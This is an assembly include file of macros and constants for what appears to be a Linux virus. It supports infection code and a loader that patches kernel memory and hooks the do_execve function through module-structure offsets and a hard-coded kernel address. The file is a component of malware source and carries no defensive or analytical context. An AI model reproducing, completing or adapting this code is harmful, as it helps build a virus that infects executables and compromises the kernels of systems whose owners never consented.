%define	O(L)		(L - virus_start)

%macro movb 2
%if %2 == 0
	xor	%1, %1
%else
	push	byte %2
	pop	%1
%endif
%endmacro

%define	DIRENT_SIZE	268
%define	IBUFFER_SIZE	4096
%define	DIRENT_DNAME	10
%define	ENOSYS		38

; for infect.asm --------------------------------------------------------------
%define	PAGE_SIZE	4096
; offsets in buffer
%define B_VIRVADDR	0
%define	B_CALLADDR	4
%define B_DISTABLE	8

; for loader.asm --------------------------------------------------------------
%define	KMEM_ADDR	0xc0100000			; startup_32
; offsets within module structure
%define	mod_szst	0
%define mod_name	8
%define mod_size	12
%define mod_init	44
%define mod_fini	48

; for module.asm --------------------------------------------------------------
%define	GFP_KERNEL	0xf0				; linux/mm.h
%define ALLOC_SIZE	8192
%define NOPS		0x90909090			; sync disasm

; offset to buffer for the bytes from the start of the do_execve function
%define PBUF_OFFSET	(VIRUS_SIZE)

; offset to buffer for the infect function
%define IBUF_OFFSET	(VIRUS_SIZE + PATCH_SIZE)
